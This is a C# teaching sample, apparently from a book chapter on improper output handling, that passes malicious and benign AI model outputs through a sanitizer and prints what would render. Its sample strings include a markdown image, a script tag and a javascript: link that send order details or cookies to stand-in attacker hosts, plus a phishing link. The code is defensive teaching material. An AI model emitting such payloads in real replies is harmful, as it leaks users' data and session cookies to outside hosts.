// Chapter 13, Section 13.4: Improper output handling.
// Runs a set of malicious and benign model outputs through AssistantOutputSanitizer (in
// Shared/Northwind.Shared/Security) and shows what would be rendered. Needs no model.

using Northwind.Shared.AI;
using Northwind.Shared.Security;

SampleConsole.Header("Chapter 13.4: Safe output handling");

var sanitizer = new AssistantOutputSanitizer(
    new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "www.northwindtraders.example", "help.northwindtraders.example" });

(string Description, string Output)[] outputs =
[
    ("Image-based exfiltration (fetched without a click)",
     "Here is your order summary. ![tracking](https://attacker.example/collect?d=NW-10248%20Thomas%20Hardy%20London)"),

    ("Raw HTML and script",
     "Click <a href=\"https://evil.example\">here</a> for help. <script>fetch('https://evil.example?c='+document.cookie)</script>"),

    ("A link to an allowed host over HTTPS (kept)",
     "You can read our [returns policy](https://www.northwindtraders.example/policies/returns) for details."),

    ("An allowed host over plain HTTP, and an unknown host (both unlinked)",
     "See [the details](http://www.northwindtraders.example/insecure) or [claim your voucher](https://attacker.example/phish)."),

    ("A javascript: link",
     "[Claim your refund](javascript:document.location='https://attacker.example/?c='+document.cookie)"),

    ("Ordinary text",
     "Your refund of $95.00 will reach your original payment method within 5 to 10 business days.")
];

foreach ((string description, string output) in outputs)
{
    SampleConsole.Section(description);
    Console.WriteLine($"model:     {output}");
    Console.WriteLine($"rendered:  {sanitizer.Sanitize(output)}");
}

SampleConsole.Note("Regular expressions are a pragmatic first line. In production, also render Markdown with HTML " +
                   "disabled and set a content security policy that restricts where images can be loaded from.");
